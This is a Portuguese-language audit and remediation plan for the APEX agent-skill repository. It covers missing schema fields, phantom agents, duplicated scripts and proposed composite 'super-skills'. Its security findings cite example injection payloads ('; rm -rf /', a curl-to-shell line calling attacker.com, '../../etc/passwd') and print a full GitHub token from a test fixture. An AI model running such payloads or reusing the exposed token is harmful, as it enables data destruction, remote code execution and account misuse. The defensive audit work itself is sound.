# APEX Super-Skills Master Report — v00.36.0
*Consolidação de 5 análises | 2026-04-17*

---

## Executive Summary

**10 achados críticos cross-análise — o que realmente importa**

1. **`executor:` ausente em 93% do corpus (3.591/3.889 SKILL.md)** — o campo mais fundamental para dispatch determinístico do router APEX está vazio. Toda skill sem executor se comporta como `LLM_BEHAVIOR` implícito, anulando o contrato DSL. É o bloqueador número-um para super-skills.

2. **Shell injection crítica confirmada e não remediada** — `run_experiment.py` e `result_ranker.py` executam `eval_cmd` user-provided com `shell=True` sem sanitização alguma. O próprio código admite o risco em comentário. Ambos existem em duas cópias (algorithms/ e skills/). Correção obrigatória em menos de 24h.

3. **4 agentes fantasma bloqueiam o pipeline base** — `theorist`, `event_observer`, `meta_learning_agent` e `programme_director` estão declarados no `kernel.agent_roster.base_agents` mas não têm AGENT.md. O `theorist` é o STEP intermediário entre `architect` e `engineer`. O pipeline epistêmico central do APEX está estruturalmente incompleto.

4. **163 agentes existem em disco mas nunca são ativados** — os 140 community-subagents (OPP-150) e os 23 agentes `cs_*` não estão registrados no `community_agent_roster` do boot. São literalmente inacessíveis ao pipeline de meta_reasoning. Investimento de desenvolvimento com zero retorno até serem registrados.

5. **SR_40 compliance de 0,13% (5/3.889 arquivos)** — a seção `## Why This Skill Exists` — o diferencial mais crítico para disambiguation semântica em LLMs — está presente em apenas 7 arquivos de todo o repositório. Sem "why", o LLM não consegue diferenciar `skill-creator` do domínio engineering do `skill-creator` do domínio design (14 cópias identificadas).

6. **~28% das descriptions são nulas, placeholder ou noun-phrase sem verbo imperativo** — 1.086 skills têm description vazia, 20 têm placeholder literal `'One sentence - what this skill does'`, e ~1.100 não usam verbo imperativo. Input_schema com `<describe your request>` em 2.590 skills torna o routing LLM funcionalmente cego.

7. **181 arquivos Python duplicados entre `algorithms/claude-skills/` e `skills/engineering/`** — cópia upstream vendored vs nativa, com drift iminente. Mais 29 entre `anthropic-skills/` e `anthropic-official/`. 7 cópias de `sample_size_calculator.py` espalhadas por domínios. 5 scanners de segurança com regras sobrepostas e possivelmente conflitantes.

8. **1.159 skills semanticamente órfãs (31%) sem `anchors:`** — concentradas em `anthropic-official/` e `anthropic-skills/` (as de maior qualidade narrativa). Foram importadas sem passar pelo pipeline de normalização APEX e estão completamente desconectadas do grafo de sinergia. O `synergy_map` de 68% das skills restantes é boilerplate de template, não mapeamento real.

9. **Nenhum script Python nos 605 scripts de skills declara `skill_id`/`what_if_fails` no cabeçalho** — a rastreabilidade script↔skill é zero. Scripts não se identificam como parte da skill que os possui. Com apenas 6 arquivos `test_*.py` para 589 scripts Python (cobertura de 1%), scripts financeiros e de segurança não têm nenhuma rede de segurança contra regressão.

10. **O único pipeline end-to-end nativo verificável é `engineering_agentops`** — os 8 passos de brainstorming→verification são o único domínio com `cross_domain_bridges` reais e `synergy_map` de qualidade. Todos os outros 51 domínios têm skills isoladas sem fluxo declarativo. Essa arquitetura é o modelo a ser replicado para criar super-skills em todos os domínios.

---

## Diagnóstico Atual (Estado Real)

| Dimensão | Score | Principais Gaps |
|---|---|---|
| **Scripts** | 7.0/10 | 40 scripts com `shell=True`; 2 shell injections críticas; 1% cobertura de testes; zero rastreabilidade skill_id em cabeçalhos; 181 arquivos duplicados |
| **Skills** | 4.5/10 | executor ausente em 93%; 28% descriptions nulas/placeholders; SR_40 em 0,13%; 841 Composio semanticamente idênticas; anchors com ruído lexical |
| **Agents** | 5.5/10 | 4 fantasmas no pipeline base; 163 sem registro no boot; 95,8% sem campo `security:`; capabilities genéricas `[code_assistance]`; `activation_protocol` centralizado no boot em vez de por agente |
| **Synergy** | 4.0/10 | 31% skills órfãs sem anchors; synergy_map 68% boilerplate; apenas engineering_agentops com pipelines declarativos reais; 6 gaps de pipeline críticos identificados (MLOps, security gate CI/CD, finance+legal, etc.) |
| **Security** | 5.0/10 | R-01/R-02 críticos abertos (shell injection); 206/215 AGENT.md sem `security:`; 1.198 SKILL.md sem `security:`; token GitHub em fixture; path traversal em 30+ scripts |

---

## Problemas Críticos (Bloqueadores para Super-Skills)

### BLOCO A — SEGURANÇA (Remediação imediata obrigatória)

---

**CRÍTICO-01: Shell Injection em `run_experiment.py` e `result_ranker.py`**

- **Descrição**: `eval_cmd` fornecido por usuário/LLM executado via `subprocess.run(eval_cmd, shell=True)` sem sanitização. O próprio comentário no código admite o risco. Payload como `; rm -rf / ` ou `$(curl attacker.com/x | sh)` seria executado diretamente.
- **Evidência**: `run_experiment.py:96` — `# Note: shell=True is intentional here — eval_cmd is user-provided`. `result_ranker.py:85` — `eval_cmd = args.eval_cmd or config.get("eval_cmd")`.
- **Localização**:
  - `/skills/engineering/cs-engineering/autoresearch-agent/scripts/run_experiment.py`
  - `/algorithms/claude-skills/src/engineering/autoresearch-agent/scripts/run_experiment.py`
  - `/skills/engineering/cs-engineering/agenthub/scripts/result_ranker.py`
  - `/algorithms/claude-skills/src/engineering/agenthub/scripts/result_ranker.py`
- **Remediação**: Substituir por allowlist de comandos + `shlex.split()`. Se comandos com pipes/redirects forem necessários, exigir aprovação explícita do usuário com whitelist de padrões permitidos. Esforço: 2–4h.

---

**CRÍTICO-02: Token GitHub potencialmente ativo em fixture de teste**

- **Descrição**: Token `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` hardcoded em arquivo de teste em repositório público. Mesmo que seja teste, o padrão `ghp_` indica token real.
- **Evidência**: `algorithms/claude-code-action/src/test/sanitizer.test.ts:248`.
- **Remediação**: Verificar revogação no GitHub imediatamente. Substituir por `ghp_EXAMPLE_TOKEN_FOR_TESTING_ONLY`. Esforço: 30min.

---

**ALTO-03: `gws_recipe_runner.py` — recipe commands com `shell=True`**

- **Descrição**: `cmd` iterado de `recipe.commands` passado para `subprocess.run(cmd, shell=True)`. Se recipes forem editáveis por usuário ou carregadas de fonte externa, é command injection.
- **Localização**: `skills/engineering/cs-engineering-team/google-workspace-cli/scripts/gws_recipe_runner.py:321`.
- **Remediação**: Migrar para lista de args ou adicionar `shlex.quote()` + validação de comandos permitidos. Esforço: 1–2h.

---

**ALTO-04: Path traversal em 30+ scripts com `open(args.input)`**

- **Descrição**: Dezenas de scripts aceitam `args.input` e abrem diretamente sem validar o path. Com acesso a argumentos controlados por usuário/LLM, `../../etc/passwd` funcionaria.
- **Evidência**: `migration_planner.py:606`, `pipeline_analyzer.py:471`, `okr_tracker.py:732`, `pmf_scorer.py:563`, `team_scaling_calculator.py:534` e 25+ outros.
- **Remediação**: Adicionar `pathlib.Path(args.input).resolve()` + check de diretório permitido em todos os scripts. Script automatizável via grep+sed. Esforço: 8–16h.

---

### BLOCO B — SCHEMA E RASTREABILIDADE (Bloqueadores para dispatch)

---

**CRÍTICO-05: `executor:` ausente em 93% das skills (3.591 arquivos)**

- **Descrição**: Sem `executor`, o router APEX não consegue fazer dispatch determinístico. Todas as 3.591 skills sem executor se comportam como `LLM_BEHAVIOR` implícito, independente de terem scripts, código sandbox ou serem integrações.
- **Evidência**: Grep em 3.889 SKILL.md: `executor:` presente em apenas 298 arquivos (7,7%).
- **Localização**: Concentrado em `antigravity-awesome-skills` (1.383 sem executor), `claude-skills-main` (226), `skills-main` (193), e todo o cluster sem `source_repo` (1.659).
- **Remediação**: Script de inferência por domínio:
  - `skills/integrations/*` → `executor: HYBRID`
  - `skills/algorithms/*` com código Python → `executor: SANDBOX_CODE`
  - Demais sem scripts → `executor: LLM_BEHAVIOR`
  Script executável como `tools/infer_executor.py`. Esforço: 4h script + validação.

---

**CRÍTICO-06: 4 agentes fantasma no pipeline base**

- **Descrição**: `theorist`, `event_observer`, `meta_learning_agent`, `programme_director` declarados no `kernel.agent_roster.base_agents` sem AGENT.md correspondente. O `theorist` é o STEP intermediário entre `architect` e `engineer` no pipeline epistêmico principal.
- **Evidência**: Análise de AGENT.md — 215 arquivos existem, mas os 4 identificados acima estão no roster do boot sem arquivo.
- **Remediação**: Criar 4 AGENT.md seguindo o padrão de `anchor_destroyer.md` (tier 1, LLM_BEHAVIOR, `position_in_pipeline` explícito, `activation_condition` no YAML). OPP dedicado para cada agente. Esforço: 8–16h total.

---

**ALTO-07: 163 agentes em disco sem registro no boot**

- **Descrição**: 140 community-subagents (OPP-150) e 23 agentes `cs_*` existem como AGENT.md mas não estão no `community_agent_roster` do boot. O `meta_reasoning` não os conhece; nunca serão ativados automaticamente.
- **Evidência**: Análise do roster: `community-subagents` (140) e `cs_*` (23) sem registro em nenhuma seção do `apex_v00_36_0_master_full.txt`.
- **Remediação**: Criar OPP para adicionar `subagent_roster` e `business_persona_roster` no boot com mapeamento `activates_when` por categoria. Esforço: 1 OPP + 8h de edição do master.

---

**ALTO-08: `skill_id:` e `status:` ausentes em 1.630 skills**

- **Descrição**: 42% das skills não têm `skill_id` (rastreabilidade zero) e 42% não têm `status` (pipeline de promoção CANDIDATE→ADOPTED inoperante para essas skills).
- **Localização**: Cluster "Integração Mínima" — skills Composio-auto-geradas e anthropic-skills originais.
- **Remediação**: Script `tools/generate_skill_id.py` que deriva `skill_id` de `domain_path` normalizado. `status: CANDIDATE` como default para todos sem status. Esforço: 2h script.

---

### BLOCO C — QUALIDADE E DISAMBIGUATION (Bloqueadores para super-skills)

---

**ALTO-09: SR_40 compliance de 0,13% — `## Why This Skill Exists` quase ausente**

- **Descrição**: A seção que explica a razão de existência de uma skill — o principal diferencial para disambiguation semântica em LLMs — está em apenas 7 dos 3.889 arquivos. Sem "why", o LLM não distingue entre as 14 cópias de `skill-creator` espalhadas por diferentes domínios.
- **Evidência**: Grep de `## Why This Skill Exists` retorna 7 matches. `## When to Use` em 1.270, mas sem "why" o contexto é incompleto.
- **Remediação**: Geração em lote via LLM: usar o campo `purpose:` quando existente, ou o primeiro parágrafo do corpo da skill como seed para gerar a seção `## Why This Skill Exists`. Priorizar as 1.663 skills com `## When to Use` mas sem `## Why`. Esforço: script + batch LLM ~1 semana.

---

**ALTO-10: 2.590 skills com `input_schema` boilerplate `<describe your request>`**

- **Descrição**: O placeholder não substituído `<describe your request>` como trigger de 2.590 skills torna o routing LLM funcionalmente cego. Não discrimina quando acionar uma skill específica vs qualquer outra.
- **Evidência**: Grep de `<describe your request>` retorna 2.590 matches em SKILL.md.
- **Remediação**: Para cada skill, extrair 3-5 triggers específicos do corpo via LLM batch e substituir o placeholder. Template alvo: `triggers: ["verbo específico objeto", "outro trigger concreto"]`. Esforço: script + batch LLM ~1-2 semanas.

---

**MÉDIO-11: 841 skills Composio semanticamente idênticas**

- **Descrição**: 841 skills em `skills/integrations/composio/` seguem o mesmo template "Automate [X] tasks via Rube MCP". São tecnicamente a mesma meta-skill parametrizada fragmentada em 841 arquivos, inflando o índice e dificultando routing.
- **Remediação**: Criar `skills/integrations/composio/SKILL.md` como meta-skill com `parameter: toolkit_name`. 841 arquivos atuais viram stubs de 3 linhas com `extends: integrations.composio.meta` + `parameter: <nome>`. Esforço: 1 reescrita + script para gerar stubs.

---

**MÉDIO-12: Anchors com ruído lexical em ~2.630 skills**

- **Descrição**: Anchors gerados automaticamente a partir de palavras da description produzem valores como `- specializing`, `- modern`, `- patterns` que não adicionam valor semântico para routing. O vocabulário canônico real (`data_science`, `knowledge_management`, `engineering`) está nos `cross_domain_bridges`, não nos `anchors:` primários.
- **Remediação**: Definir lista canônica de ~60 anchors permitidos baseada nos gravitation nodes reais (§5 da análise de sinergia). Script que filtra anchors fora da lista e os remove ou mapeia para o anchor canônico mais próximo. Esforço: 2h definição + 4h script.

---

## Plano de Reescrita — Super-Skills Standard

### Fase 1: Remediações de Segurança (IMEDIATO — 1-2 dias)

**Owner**: Engenheiro designado (ou script + revisão manual)
**Gate de saída**: CI/CD bloqueia merge se R-01/R-02 presentes

| # | Ação | Arquivos | Esforço | Owner |
|---|------|----------|---------|-------|
| 1.1 | Substituir `eval_cmd + shell=True` por allowlist em `run_experiment.py` e `result_ranker.py` (4 arquivos — 2 em skills/, 2 em algorithms/) | `run_experiment.py:96`, `result_ranker.py:85` | 2–4h | Manual |
| 1.2 | Revogar token `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` no GitHub e substituir por placeholder | `sanitizer.test.ts:248` | 30min | Manual |
| 1.3 | Adicionar `shlex.quote()` em `gws_recipe_runner.py:321` | 1 arquivo | 1h | Manual |
| 1.4 | Criar script `tools/fix_path_traversal.py` que adiciona `Path(x).resolve()` + check de diretório nos 30+ scripts com `open(args.input)` | 30+ scripts | 8h | Script automatizado |
| 1.5 | Criar validador CI que rejeita AGENT.md sem campo `security:` para agentes com `tools: [Bash, Write, WebFetch]` | `agents/` | 4h | Script automatizado |

**Script de referência para 1.4**:
```python
# tools/fix_path_traversal.py
import re
from pathlib import Path

SAFE_OPEN_PATTERN = r'open\(args\.(\w+)\b'
SAFE_REPLACEMENT = r'open(Path(args.\1).resolve())'
# Aplicar em todos skills/**/*.py com argparse + open(args.input)
```

---

### Fase 2: Normalização de Schema (CURTO PRAZO — 1-2 semanas)

**Owner**: Scripts automatizados + revisão por amostragem
**Gate de saída**: `tools/validate_skills.py` retorna 0 erros nos campos obrigatórios

| # | Ação | Volume | Esforço | Script |
|---|------|--------|---------|--------|
| 2.1 | Inferir e preencher `executor:` por domínio | ~3.591 skills | 4h | `tools/infer_executor.py` |
| 2.2 | Gerar `skill_id:` para skills sem identificador | ~1.630 skills | 2h | `tools/generate_skill_id.py` |
| 2.3 | Adicionar `status: CANDIDATE` onde ausente | ~1.630 skills | 1h | Patch script |
| 2.4 | Adicionar campo `security:` mínimo em AGENT.md sem ele | 206 AGENT.md | 4h | `tools/patch_agent_security.py` |
| 2.5 | Adicionar campo `security:` em SKILL.md sem ele | ~1.198 skills | 4h | `tools/patch_skill_security.py` |
| 2.6 | Criar 4 AGENT.md para agentes fantasma do pipeline base | 4 arquivos | 8-16h | Manual (alta precisão) |
| 2.7 | Registrar 140 subagents + 23 cs_* no boot via OPP | 163 agentes | 8h | OPP-153 |
| 2.8 | Adicionar cabeçalho APEX obrigatório nos 605 scripts de skills | ~589 .py | 4h | `tools/add_script_header.py` |
| 2.9 | Corrigir version drift em `skill_forge.py` — ler de arquivo canônico em vez de hardcoded | 1 arquivo | 30min | Manual |
| 2.10 | Fixar mismatch de identidade em `vue-state-manager/AGENT.md` | 1 arquivo | 30min | Manual |

**Script `tools/infer_executor.py` — lógica de inferência**:
```python
EXECUTOR_RULES = [
    ("skills/integrations/", "HYBRID"),
    ("skills/algorithms/", "SANDBOX_CODE"),
    ("skills/engineering/cs-engineering/", "LLM_BEHAVIOR"),
    # fallback
    ("skills/", "LLM_BEHAVIOR"),
]

def infer_executor(skill_path: Path) -> str:
    for prefix, executor in EXECUTOR_RULES:
        if str(skill_path).replace("\\", "/").find(prefix) >= 0:
            # verificar se tem scripts/ → pode ser HYBRID
            if (skill_path.parent / "scripts").exists():
                return "HYBRID"
            return executor
    return "LLM_BEHAVIOR"
```

**Cabeçalho APEX obrigatório para scripts Python**:
```python
"""
skill_id: <dominio.subdominio.nome_da_skill>
script_purpose: <Uma frase: o que este script faz e quando é invocado>
why: <Por que este script existe — qual problema resolve>
what_if_fails: [SCRIPT_ERROR:<id>]; retornar JSON {"error": "<mensagem>", "code": <int>}; nunca bloquear a skill pai.
apex_version: v00.36.0
"""
```

---

### Fase 3: Disambiguation e Qualidade (MÉDIO PRAZO — 2-4 semanas)

**Owner**: Batch LLM + revisão humana por domínio
**Gate de saída**: SR_40 compliance > 50% nas top-500 skills por uso; zero placeholders em input_schema

| # | Ação | Volume | Esforço | Método |
|---|------|--------|---------|--------|
| 3.1 | Reescrever descriptions para padrão imperativo: `"[Verbo] [objeto] — [contexto]. Use when [trigger]."` | ~2.186 skills | 2 semanas | Batch LLM |
| 3.2 | Gerar seção `## Why This Skill Exists` para skills sem ela (prioridade: top-500 por domínio) | ~3.882 skills | 2-3 semanas | Batch LLM |
| 3.3 | Substituir `<describe your request>` por 3-5 triggers específicos extraídos do corpo | ~2.590 skills | 1-2 semanas | Batch LLM |
| 3.4 | Normalizar anchors — filtrar ruído lexical, mapear para vocabulário canônico de 60 anchors | ~2.630 skills | 1 semana | Script + curação |
| 3.5 | Consolidar 14 cópias de `skill-creator` e 8 de `brand-guidelines` — designar canônico, converter demais em `alias:` | ~150 skills | 3 dias | Manual |
| 3.6 | Consolidar 841 Composio em meta-skill parametrizada | 841 → 1 + stubs | 3 dias | Script |
| 3.7 | Migrar 32 skills `anthropic-skills/` para schema APEX DSL | 32 arquivos | 1 semana | Semi-manual |
| 3.8 | Adicionar `synergy_map` real (não boilerplate) para top-10 domínios além de engineering_agentops | 10 domínios | 2 semanas | Arquitetura + OPPs |
| 3.9 | Adicionar `activation_protocol` como campo YAML em todos os agentes | 215 AGENT.md | 1 semana | Script + manual para tier 0/1 |
| 3.10 | Unificar 5 scanners de segurança em `skills/engineering/security/apex-sast/` com backends plugáveis | 5 → 1 | 3 dias | Refactor manual |

**Vocabulário canônico de anchors (60 permitidos)**:
```
# Ação: create, review, analyze, deploy, debug, optimize, test, document, monitor, refactor
# Domínio: engineering, security, data_science, marketing, finance, legal, research, design, operations, ai_ml
# Padrão: api, pipeline, agent, workflow, automation, orchestration, integration, compliance, performance
# Qualidade: testing, validation, audit, verification, quality_gate, fmea
# Infraestrutura: cloud, devops, ci_cd, kubernetes, docker, terraform
# Linguagem: python, typescript, rust, go, java, dotnet
# Negócio: strategy, product_management, sales, content, brand, growth, hiring
# Meta: planning, brainstorming, synthesis, knowledge_management, skill_creation
```

---

### Fase 4: Super-Skills Compostas (LONGO PRAZO — 1-2 meses)

**Owner**: Arquiteto APEX + OPPs dedicados por super-skill
**Gate de saída**: Cada super-skill passa pelo Quality Gate completo do APEX_CREATION_GUIDE.md §13

| # | Ação | Dependências | Esforço |
|---|------|-------------|---------|
| 4.1 | Implementar template canônico de super-skill (ver §Padrão abaixo) | Fases 1-3 | 1 semana |
| 4.2 | Criar Top-10 super-skills propostas (ver §Super-Skills abaixo) | Fase 3 concluída | 4-6 semanas |
| 4.3 | Construir `skills/_shared/apex_script_base.py` — biblioteca base para scripts | Fase 2 | 1 semana |
| 4.4 | Criar domínio `engineering_mlops` com skills de deploy, drift, A/B (gap crítico) | Agentes mlops-engineer existente | 2 semanas |
| 4.5 | Criar skill `engineering_devops.security-gate-injector` (gap: security não injetado em CI/CD) | Fase 3 | 1 semana |
| 4.6 | Criar agentes `i18n-engineer`, `observability-engineer`, `privacy-engineer` (3 gaps críticos) | Fase 2 | 1 semana |
| 4.7 | Implementar `cross_domain_bridges` com strength scores para todos os 52 domínios | Fase 3 | 3 semanas |
| 4.8 | Aumentar cobertura de testes de 1% para ≥20% nos scripts críticos | Fase 2 | 3 semanas |

---

## Super-Skills Propostas (Top-10)

> Para cada super-skill: código de referência completo está nas análises originais. Aqui: nome, skills compostas, pipeline declarativo, valor entregue e gap preenchido.

---

### SS-01: `engineering_agentops.full_dev_cycle`

**Skills compostas**: `brainstorming` → `writing-plans` → `subagent-driven-development` OR `executing-plans` → `test-driven-development` → `verification-before-completion` → `finishing-a-development-branch` → `requesting-code-review`

**Pipeline**: 8 fases com HARD-GATE entre cada uma. Fase 1 (design aprovado) é gate obrigatório — sem aprovação, não avança para código.

**Schema resumido**:
```yaml
skill_id: engineering_agentops.full_dev_cycle
tier: SUPER
executor: LLM_BEHAVIOR
input_schema:
  - feature_request: string (required)
  - execution_mode: subagent | inline (default: subagent)
output_schema:
  - design_doc_path, plan_file_path, pr_url, test_coverage, phases_completed
```

**Valor entregue**: Qualquer feature request vai do "vago idea" ao PR pronto para merge com evidência de testes. Elimina o comportamento de "pular design e ir direto para código".

**Gap preenchido**: Pipeline engineering_agentops existe fragmentado em 14 skills isoladas. A super-skill declara a sequência obrigatória e os gates.

---

### SS-02: `security_engineering.secure_delivery_pipeline`

**Skills compostas**: `security.dependency-auditor` → `security.claude-code-security-review` → `security.security-pen-testing` → `engineering_security.isms-audit-expert` → `security.incident-commander` → `engineering_agentops.verification-before-completion`

**Pipeline**: 6 fases, gate final `gate_passed: boolean` bloqueia deploy se falso.

**Valor entregue**: Nenhum código chega a produção sem passar por auditoria de dependências, revisão de código, pen testing e compliance ISMS. Resolve o gap crítico onde security e CI/CD não se comunicam.

**Gap preenchido**: `security.codebase-audit-pre-push` existe mas não está injetado declarativamente no pipeline de CD.

---

### SS-03: `business_intelligence.deal_due_diligence`

**Skills compostas**: `finance.financial-analysis` + `finance.investment-banking` (paralelas) com `legal.contracts` + `legal.compliance` (paralelas) → `operations.risk-assessment` → recomendação `go | no_go | conditional_go`

**Pipeline**: Análise paralela de 4 skills simultâneas, depois integração.

**Valor entregue**: Due diligence M&A/investimento completo em uma única invocação, com output integrado e recomendação acionável.

**Gap preenchido**: `finance` e `legal` têm skills de alta qualidade mas zero bridge declarada entre elas — são ilhas semanticamente isoladas.

---

### SS-04: `ai_ml.intelligent_agent_factory`

**Skills compostas**: `ai_ml_agents.agent-designer` → `engineering_agentops.writing-skills` → `engineering_agentops.brainstorming` → `ai_ml_agents.agent-workflow-designer` → `community_general.skill-tester`

**Pipeline**: Design → Skills → Refinamento → Workflow → Eval.

**Valor entregue**: Agente LLM pronto para produção com spec completa, skills APEX conformes e resultados de avaliação verificados.

**Gap preenchido**: `ai_ml_agents` (design) e `engineering_agentops` (implementação) existem mas sem bridge declarada.

---

### SS-05: `growth_engine.full_funnel_optimizer`

**Skills compostas**: `marketing.competitive-brief` → `marketing.campaign-plan` → `marketing.brand-voice` → `marketing.ab-test-setup` → `marketing.analytics-tracking` → `sales.call-summary`

**Pipeline**: Ciclo fechado de crescimento com feedback loop de sales.

**Valor entregue**: Otimização do funil completo de acquisition→retention com dados e iteração baseada em evidência.

**Gap preenchido**: Marketing tem 102 skills, sales 17, mas sem pipeline formal de go-to-market com loop de feedback.

---

### SS-06: `engineering_mlops.model_production_pipeline`

**Skills compostas** (a criar): `ai_ml_ml.model-training` → `engineering_devops.ci-cd-pipeline` → `engineering_mlops.model-deployment` → `engineering_mlops.drift-monitor` → `engineering_mlops.ab-test-ml`

**Gap preenchido**: `ai_ml_ml` tem skills de treinamento, `engineering_devops` tem CI/CD, mas o domínio `engineering_mlops` não existe. É o maior gap de pipeline identificado — modelo treinado sem caminho para produção.

**Nota**: Requer criação do domínio `engineering_mlops` como parte da Fase 4.

---

### SS-07: `product_management.sprint_orchestrator`

**Skills compostas**: `operations.capacity-plan` → `product-management.sprint-planning` → `product-management.roadmap` → `operations.risk-assessment` → `product-management.synthesize-research`

**Valor entregue**: Sprint completo de produto com capacidade, roadmap, riscos e síntese de pesquisa em pipeline único.

**Gap preenchido**: `product-management` (11 skills) e `operations` (10 skills) têm sinergia óbvia não declarada.

---

### SS-08: `healthcare_regulatory.compliance_orchestrator`

**Skills compostas**: `healthcare.clinical-guidelines` → `legal.compliance` → `legal.regulatory-filing` → `operations.risk-assessment`

**Valor entregue**: Compliance regulatório para produtos de saúde (FDA, ANVISA, LGPD) em pipeline integrado.

**Gap preenchido**: `healthcare` e `legal` são ilhas sem bridge — compliance regulatório requer ambos.

---

### SS-09: `knowledge_work.research_to_product`

**Skills compostas**: `science_research.literature-review` → `knowledge-management.synthesis` → `product-management.synthesize-research` → `product-management.roadmap`

**Valor entregue**: Da pesquisa científica ao requisito de produto em pipeline declarativo.

**Gap preenchido**: `science_research` → `product-management` sem bridge declarada. `product-management.synthesize-research` existe mas sem link para `science_research`.

---

### SS-10: `apex_meta.skill_quality_lifecycle`

**Skills compostas**: `engineering_agentops.writing-skills` → `community_general.skill-tester` → `security.skill-security-auditor` → `engineering_agentops.verification-before-completion` → promoção `CANDIDATE → ADOPTED`

**Valor entregue**: Pipeline completo de criação, teste, auditoria de segurança e promoção de skills APEX. A super-skill que governa a criação de todas as outras.

**Gap preenchido**: Existem 3 pontos de validação separados (`tools/validate_skills.py`, `skill-tester/`, `skill-security-auditor/`) sem pipeline de promoção declarativo unificado.

---

## Padrão Super-Skill (Template Canônico)

> Copiável e funcional no APEX DSL. Substitua todos os `<PLACEHOLDER>` antes de usar.

```yaml
---
# ═══════════════════════════════════════════════════════════════
# APEX SUPER-SKILL — Template Canônico v00.36.0
# Criado via: OPP-<N> | Data: <YYYY-MM-DD>
# ═══════════════════════════════════════════════════════════════

# IDENTIDADE OBRIGATÓRIA
skill_id: <dominio_a.dominio_b.nome_unico_snake_case>
name: <nome-legivel-com-hifens>
version: v00.36.0
status: CANDIDATE
tier: SUPER
apex_version: v00.36.0
diff_link: diffs/v00_36_0/OPP-<N>_<nome>.yaml

# PROPÓSITO (obrigatório — 2-4 linhas, verbo imperativo)
description: >
  <Verbo imperativo> <objeto direto> — <contexto de ativação em 1 frase>.
  Orquestra <N> skills em pipeline determinístico: <skill1> → <skill2> → <skillN>.
  Use when <trigger específico e concreto>.
  Resolve o gap entre <domínio A> e <domínio B> onde <problema específico>.

# POSICIONAMENTO SEMÂNTICO (mínimo 8 anchors do vocabulário canônico)
domain_path: <dominio>/<subdominio>
anchors:
  - <anchor_canonico_1>       # Do vocabulário de 60 anchors permitidos
  - <anchor_canonico_2>
  - <anchor_canonico_3>
  - <anchor_canonico_4>
  - <anchor_canonico_5>
  - <anchor_canonico_6>
  - <anchor_canonico_7>
  - <anchor_canonico_8>

# EXECUTOR (obrigatório — nunca deixar vazio)
executor: LLM_BEHAVIOR   # LLM_BEHAVIOR | HYBRID | SANDBOX_CODE
# Se HYBRID: scripts/ deve existir no diretório da skill

# RISCO
risk: <safe | medium | high>

# SEGURANÇA (obrigatório — P4 do APEX_CREATION_GUIDE)
security:
  data_access: <none | restricted | full>
  injection_risk: <low | medium | high>
  trusted_domains: []       # Se vazio: nenhuma URL externa permitida
  mitigation:
    - <Regra de mitigação explícita — ex: "inputs validados antes de qualquer subprocess">
    - <Segunda regra se data_access != none>

# COMPATIBILIDADE LLM
llm_compat:
  allowed: [claude, gpt4o, gemini, llama]
  restrictions:
    - "Pipelines paralelos requerem suporte a subagents — degradar para inline em modelos sem suporte"
  degradation_strategy: "Executar fases sequencialmente em vez de paralelas; notificar usuário"

# INTERFACES (contratos explícitos — nunca genérico)
input_schema:
  type: natural_language
  triggers:
    - "<trigger específico 1 — verbo + objeto concreto>"
    - "<trigger específico 2>"
    - "<trigger específico 3>"
  parameters:
    - name: <param_obrigatorio>
      type: <string | object | array | number | boolean>
      required: true
      description: "<O que é, formato esperado, exemplo>"
    - name: <param_opcional>
      type: <tipo>
      required: false
      default: "<valor_default>"
      description: "<O que é>"
  required_context: "<O que o LLM deve ter disponível para executar esta super-skill>"

output_schema:
  format: structured_json
  fields:
    - name: <campo_principal>
      type: <tipo>
      description: "<O que contém — formato exato, não 'texto livre'>"
    - name: <campo_status>
      type: object
      description: "Status de cada fase: {fase_N: {completed: bool, output_path: str, timestamp: str}}"
    - name: phases_completed
      type: array
      description: "Lista de IDs de fases executadas com sucesso"
    - name: errors
      type: array
      description: "Lista de erros por fase: [{phase: str, error: str, recoverable: bool}]"

# TRATAMENTO DE FALHAS (obrigatório — P2 do APEX_CREATION_GUIDE)
what_if_fails: >
  Fase <1>: <condição de falha> → <ação de recuperação>. Nunca pular para fase seguinte.
  Fase <2>: <condição de falha> → <ação de recuperação ou escalação humana>.
  Gate final: Se phases_completed < N_obrigatorio → retornar errors + partial_output. Nunca simular sucesso.
  Regra geral: Em caso de ambiguidade de input, perguntar ao usuário — nunca inferir silenciosamente.

# MAPA DE SINERGIA (o coração da super-skill)
synergy_map:
  - type: skill
    ref: <dominio.skill_id>           # ID canônico da skill — deve existir no repo
    benefit: "<o que esta skill entrega neste contexto específico>"
    call_when: "<condição de ativação desta fase>"
    protocol: >
      → <Descrição do handoff de entrada>
      → <O que a skill faz>
      → <O que produz como saída para próxima fase>
    strength: <0.0-1.0>              # Força da dependência — 1.0 = obrigatória
    parallel_with: [<skill_id>]      # Se executável em paralelo com outra skill

  - type: skill
    ref: <dominio.skill_id_2>
    benefit: "<benefício>"
    call_when: "<condição>"
    protocol: >
      → <handoff>
    strength: <0.0-1.0>

  # ... repetir para cada fase do pipeline

# FMEA MÍNIMO (obrigatório para tier SUPER)
fmea:
  modes:
    - mode: "Input insuficiente para <fase crítica>"
      probability: medium
      severity: high
      detection: "Verificação de campos obrigatórios no início"
      mitigation: "Solicitar input adicional ao usuário antes de iniciar pipeline"
      rpn: 6
    - mode: "Skill dependente não disponível (<ref>)"
      probability: low
      severity: high
      detection: "Verificação de existência da skill antes de invocar"
      mitigation: "Retornar erro explícito com nome da skill ausente; não simular resultado"
      rpn: 4
    - mode: "Fase intermediária produz output inválido"
      probability: medium
      severity: medium
      detection: "Validação de schema de saída entre fases"
      mitigation: "Retornar partial_output com errors detalhados; não continuar pipeline"
      rpn: 4
---

## Why This Skill Exists

<Seção SR_40 obrigatória — 2-4 parágrafos>

**Problema**: <Qual é o problema que esta super-skill resolve? Por que as skills individuais não bastam?>

**Posição no ecossistema APEX**: Esta super-skill ocupa o gap entre <domínio A> e <domínio B>. 
Sem ela, um usuário precisaria <descrever o workflow manual sem a super-skill>.

**Diferencial**: O que torna esta super-skill única é <o que a distingue de simples chamadas sequenciais às skills componentes>.

## When to Use

**Ativar quando**:
- <Trigger 1 concreto e específico>
- <Trigger 2>
- <Trigger 3>

**Não ativar quando**:
- <Anti-trigger 1 — quando outra skill/agente é mais apropriado>
- <Anti-trigger 2>

**Pré-requisitos**: <O que deve existir antes de invocar — contexto, dados, permissões>

## Pipeline de Execução

```
FASE 1: <nome_fase>
  INPUT: <o que recebe>
  GATE: <condição obrigatória para avançar>
  OUTPUT: <o que produz>
  FALHA: <o que fazer se falhar>
    ↓
FASE 2: <nome_fase>
  INPUT: output da FASE 1
  GATE: <condição>
  ...
    ↓
FASE N (FINAL):
  OUTPUT: <entregável final>
  GATE DE CONCLUSÃO: <critério de sucesso>
```

## What If Fails

| Cenário | Ação | Escalação |
|---------|------|-----------|
